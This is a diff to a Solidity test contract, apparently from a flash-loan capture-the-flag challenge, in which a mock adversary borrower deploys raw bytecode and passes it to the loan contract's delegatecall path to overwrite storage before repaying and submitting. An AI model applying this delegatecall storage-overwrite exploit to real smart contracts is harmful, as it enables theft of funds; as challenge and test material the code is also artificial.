@@ -1,16 +1,16 @@
 pragma solidity ^0.8.17;
 
-import {ITransientLoan} from "../../src/interfaces/ITransientLoan.sol";
-import {IFlashLoanReceiver} from "../../src/interfaces/IFlashLoanReceiver.sol";
-import {MockToken} from "./MockERC20.sol";
+import { ITransientLoan } from "../../src/interfaces/ITransientLoan.sol";
+import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
+import { Token } from "../../src/Token.sol";
 
 contract MockAdversaryBorrower is IFlashLoanReceiver {
     /// @notice The transient loan contract
     ITransientLoan flashLoaner;
     /// @notice The mock erc20 that will be borrowed
-    MockToken mockToken;
+    Token mockToken;
 
-    constructor(ITransientLoan _flashLoaner, MockToken _mockToken) {
+    constructor(ITransientLoan _flashLoaner, Token _mockToken) {
         flashLoaner = _flashLoaner;
         mockToken = _mockToken;
     }
@@ -37,11 +37,17 @@ contract MockAdversaryBorrower is IFlashLoanReceiver {
         // PUSH1 1
         // SSTORE (todo: TSTORE)
         bytes memory exploitCode = hex"60058060093d393df36000600155";
-        address exploit;
+        address _exploit;
         assembly {
-            exploit := create(0x00, add(exploitCode, 0x20), mload(exploitCode))
+            _exploit := create(0x00, add(exploitCode, 0x20), mload(exploitCode))
         }
 
-        address(flashLoaner).call(abi.encodePacked(bytes4(uint32(1)), exploit));
+        // Call the flash loaner contract's delegatecall logic with our exploit contract.
+        (success,) = address(flashLoaner).call(abi.encodePacked(bytes4(uint32(1)), _exploit));
+        assert(success);
+
+        // Submit our tokens back to the flash loaner to solve the challenge.
+        mockToken.approve(address(flashLoaner), 1000);
+        flashLoaner.submit();
     }
 }
